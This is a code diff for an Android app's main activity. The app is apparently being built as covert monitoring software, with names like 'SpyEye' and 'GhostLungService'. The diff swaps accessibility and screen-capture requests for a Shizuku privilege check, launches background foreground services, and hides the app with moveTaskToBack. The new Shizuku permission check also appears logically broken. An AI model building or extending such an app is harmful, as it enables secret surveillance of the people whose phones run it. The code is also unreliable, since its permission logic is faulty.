@@ -14,9 +14,10 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import dev.rikka.shizuku.Shizuku;
+
 public class MainActivity extends Activity {
     private static final int OVERLAY_CODE = 101;
-    private static final int SCREEN_CAPTURE_CODE = 102;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -27,12 +28,12 @@ public class MainActivity extends Activity {
         layout.setGravity(Gravity.CENTER);
 
         TextView info = new TextView(this);
-        info.setText("Shadow Weaver Ready");
+        info.setText("Spectrum Protocol Ready");
         info.setTextSize(18);
         layout.addView(info);
 
         Button startBtn = new Button(this);
-        startBtn.setText("Activate All Systems");
+        startBtn.setText("Activate Spectrum");
         startBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -45,7 +46,7 @@ public class MainActivity extends Activity {
     }
 
     private void requestAllPermissions() {
-        // 1. صلاحية النافذة العائمة
+        // 1. صلاحية النافذة العائمة (Overlay)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                     Uri.parse("package:" + getPackageName()));
@@ -53,45 +54,45 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // 2. صلاحية Accessibility (عين الطيف)
-        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-        Toast.makeText(this, "Please enable SpyEye in Accessibility settings", Toast.LENGTH_LONG).show();
-        startActivity(accIntent);
+        // 2. صلاحية Shizuku
+        if (!Shizuku.isPreV11() || !Shizuku.checkSelfPermission()) {
+            Toast.makeText(this, "Please install and run Shizuku first!", Toast.LENGTH_LONG).show();
+            return;
+        }
 
-        // 3. صلاحية Screen Capture (رئة الشبح)
-        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        startActivityForResult(mpManager.createScreenCaptureIntent(), SCREEN_CAPTURE_CODE);
+        // 3. بدء خدمات الطيف
+        startServices();
+    }
+
+    private void startServices() {
+        Intent lungIntent = new Intent(this, GhostLungService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(lungIntent);
+        } else {
+            startService(lungIntent);
+        }
+
+        Intent bgIntent = new Intent(this, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(bgIntent);
+        } else {
+            startService(bgIntent);
+        }
+
+        Toast.makeText(this, "The Ultimate Spectrum is ALIVE!", Toast.LENGTH_SHORT).show();
+        moveTaskToBack(true);
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-
         if (requestCode == OVERLAY_CODE) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
-                requestAllPermissions(); // تابع باقي الصلاحيات
+                requestAllPermissions();
             } else {
                 Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show();
                 finish();
             }
-        } else if (requestCode == SCREEN_CAPTURE_CODE && resultCode == RESULT_OK) {
-            // بدء خدمات الرئة والدماغ
-            Intent lungIntent = new Intent(this, GhostLungService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(lungIntent);
-            } else {
-                startService(lungIntent);
-            }
-
-            Intent bgIntent = new Intent(this, BackgroundService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(bgIntent);
-            } else {
-                startService(bgIntent);
-            }
-
-            Toast.makeText(this, "Shadow Weaver is ALIVE!", Toast.LENGTH_SHORT).show();
-            moveTaskToBack(true);
         }
     }
 }
